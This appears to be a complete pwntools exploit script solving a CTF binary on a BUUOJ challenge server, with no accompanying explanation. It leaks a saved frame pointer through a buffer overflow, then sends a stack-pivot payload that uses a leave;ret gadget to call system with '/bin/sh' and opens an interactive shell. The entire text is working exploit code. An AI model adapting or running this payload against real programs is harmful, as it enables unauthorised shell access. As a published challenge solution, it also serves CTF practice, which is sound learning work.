from pwn import *

io=remote('node3.buuoj.cn',28060)

leave=0x8048562
sys_plt=0x8048400

pl1='a'*0x24+'bbbb'
io.send(pl1)
io.recvuntil('bbbb')
ebp=u32(io.recv(4))
print(hex(ebp))
buf=ebp-56

pl2=('aaaa'+p32(sys_plt)+'bbbb'+p32(buf+16)+'/bin/sh\x00').ljust(0x28,'a')+p32(buf)+p32(leave)
io.send(pl2)

io.interactive()